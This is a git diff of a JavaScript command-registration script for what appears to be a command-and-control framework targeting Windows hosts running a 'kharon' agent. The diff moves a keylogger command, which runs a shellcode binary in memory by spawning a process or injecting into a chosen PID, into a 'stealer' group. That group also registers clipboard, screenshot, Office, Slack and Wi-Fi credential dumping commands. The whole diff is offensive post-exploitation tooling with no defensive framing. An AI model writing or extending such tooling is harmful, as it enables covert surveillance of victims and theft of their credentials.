@@ -140,28 +140,6 @@ cmd_dotnet_fork.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
 let cmd_dotnet = ax.create_command("dotnet", ".NET Framework operations - execute assemblies and enumerate versions");
 cmd_dotnet.addSubCommands([cmd_dotnet_list_v, cmd_dotnet_inline, cmd_dotnet_fork]);
 
-// KEYLOGGER
-
-let cmd_keylogger_fork = ax.create_command("fork", "Execute Keylogger in-process spawning or injecting in the existence process", "keylogger fork -m spawn", "Task: execute Keylogger");
-cmd_keylogger_fork.addArgFlagString("-m", "fork_method", false, "Method to use fork, choice 'explicit' need use fork_pid or 'spawn'");
-cmd_keylogger_fork.addArgFlagInt("-P", "fork_pid", false, "Pid to use for inject in the explicit method");
-cmd_keylogger_fork.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-    let fork_method = parsed_json["fork_method"];
-    let fork_pid = parsed_json["fork_pid"];
-
-    let keepload = 0;
-
-    let mod_params = ax.bof_pack("int", [keepload]);
-    let mod_path = ax.script_dir() + "Shellcode/Keylogger/Bin/keylogger_assembly." + ax.arch(id) + ".bin";
-    let message = `Task: executing Keylogger in-memory`;
-
-    ax.execute_alias(id, cmdline, `execute keylogger -m fork -t ${fork_method} -p ${fork_pid}`, message);
-});
-
-let cmd_keylogger = ax.create_command("keylogger", "Install a keylogger");
-cmd_keylogger.addSubCommands([cmd_keylogger_fork]);
-
-
 // STEALER
 
 let cmd_stealer_screenshot = ax.create_command("screenshot", "Capture a screenshot of the current desktop", "stealer screenshot", "Task: capture desktop screenshot");
@@ -216,16 +194,30 @@ cmd_stealer_wifi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });    
 
+let cmd_stealer_keylogger = ax.create_command("keylogger", "Execute Keylogger in-process spawning or injecting in the existence process", "stealer keylogger", "Task: execute Keylogger");
+cmd_stealer_keylogger.addArgFlagString("-m", "fork_method", false, "Method to use fork, choice 'explicit' need use fork_pid or 'spawn'");
+cmd_stealer_keylogger.addArgFlagInt("-P", "fork_pid", false, "Pid to use for inject in the explicit method");
+cmd_stealer_keylogger.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let fork_method = parsed_json["fork_method"];
+    let fork_pid = parsed_json["fork_pid"];
+
+    let keepload = 0;
+
+    let mod_params = ax.bof_pack("int", [keepload]);
+    let mod_path = ax.script_dir() + "Shellcode/Keylogger/Bin/keylogger_assembly." + ax.arch(id) + ".bin";
+    let message = `Task: executing Keylogger in-memory`;
+
+    ax.execute_alias(id, cmdline, `execute keylogger -m fork -t ${fork_method} -p ${fork_pid}`, message);
+});
+
 let cmd_stealer = ax.create_command("stealer", "Information gathering and credential extraction operations");
-cmd_stealer.addSubCommands([cmd_stealer_clipdump, cmd_stealer_screenshot, cmd_stealer_officedump, cmd_stealer_slackdump, cmd_stealer_wifi]);
+cmd_stealer.addSubCommands([cmd_stealer_clipdump, cmd_stealer_screenshot, cmd_stealer_officedump, cmd_stealer_slackdump, cmd_stealer_wifi, cmd_stealer_keylogger]);
 
 var group_stealer  = ax.create_commands_group("Stealer Commands", [cmd_stealer]);
 var group_dotnet   = ax.create_commands_group("Dotnet Interactions", [cmd_dotnet]);
-var group_keylogger   = ax.create_commands_group("Keylogger", [cmd_keylogger]);
 var group_rmt_exec = ax.create_commands_group("Remote Execution", [cmd_rmt_exec]);
 
 ax.register_commands_group(group_stealer , ["kharon"], ["windows"], []);
 ax.register_commands_group(group_dotnet  , ["kharon"], ["windows"], []);
-ax.register_commands_group(group_keylogger  , ["kharon"], ["windows"], []);
 ax.register_commands_group(group_rmt_exec, ["kharon"], ["windows"], []);
 
